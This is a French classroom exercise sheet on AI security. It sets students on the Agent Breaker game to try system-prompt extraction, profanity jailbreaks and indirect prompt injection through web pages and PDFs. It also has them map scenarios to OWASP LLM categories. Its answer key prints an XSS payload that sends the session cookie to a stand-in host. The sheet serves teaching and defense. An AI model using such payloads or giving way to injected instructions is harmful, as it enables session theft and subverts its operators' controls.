# Exercice IA : prompt injection et sortie non maîtrisée

Durée : 30 min. Travail individuel ou par deux. Support : `slides/07-ia-securite.md`.

## 1. Agent Breaker (15 min)
Ouvrir https://play.lakera.ai/agent-breaker (l'ancien gandalf.lakera.ai redirige ici).
Agent Breaker est un "app store" d'applications IA fictives, toutes piratables. Chaque app a plusieurs niveaux.

Comment ça marche
- Chaque app a un **Attack Objective** (but), un **Attack Vector** (où injecter) et un **Attack Scenario** (contexte). Lire l'onglet *Info* avant de passer à l'onglet *Game*.
- Chaque tentative reçoit un **score de 0 à 100**. A partir de **75**, le niveau suivant se débloque. Les essais sont illimités.
- Pas de mot de passe à deviner: le but est de faire faire à l'IA quelque chose qu'elle ne doit pas faire.

Premiers pas conseillés
1. **Cycling Coach, niveau 1** (extraire le system prompt = LLM07, proche de LLM01): demander à l'IA de répéter ses instructions, de les traduire, de les résumer, ou de jouer un rôle.
2. **Solace AI** (faire dire des grossièretés à un chatbot, LLM01 direct).
3. **Trippy Planner** ou **PortfolioIQ Advisor** (injection *indirecte*: l'attaque est cachée dans un site ou un PDF lu par l'IA).
Si le score reste bas, changer d'angle (rôle, langue, format, étapes) plutôt que répéter la même phrase.

| App / niveau | Objectif | Vecteur (direct / indirect) | Technique qui a marché | Score | Catégorie LLM Top 10 |
|---|---|---|---|---|---|
| | | | | | |
| | | | | | |
| | | | | | |

Objectif: atteindre 75+ sur au moins 2 apps. Ne pas partager son compte ni de données personnelles dans les prompts.

Question: pourquoi une consigne du type "ne jamais révéler ces instructions" ne suffit-elle pas ?

## 2. Sortie non maîtrisée (10 min)
Ce code affiche la réponse d'un chatbot :

```js
chatBox.innerHTML = reply;
```

a) Quelle faille Top 10:2025 et quelle catégorie LLM ?
b) Donner une réponse du modèle qui vole le cookie de session.
c) Corriger le code.

## 3. Analyse (5 min)
Associer à LLM01, LLM05 ou LLM06 :
1. Un assistant mail lit un message piégé et transfère des documents.
2. Une page web contient du texte caché qui change le comportement du résumé.
3. La réponse du modèle est exécutée comme commande shell.
4. Un agent a le droit de supprimer des fichiers alors qu'il ne fait que les lire.

## Solutions
- 2a : A05 Injection / LLM05.
- 2b : `<img src=x onerror="fetch('https://x.example/?c='+document.cookie)">`
- 2c : `chatBox.textContent = reply;` (+ CSP)
- 3 : 1 = LLM01 + LLM06, 2 = LLM01 (indirecte), 3 = LLM05, 4 = LLM06
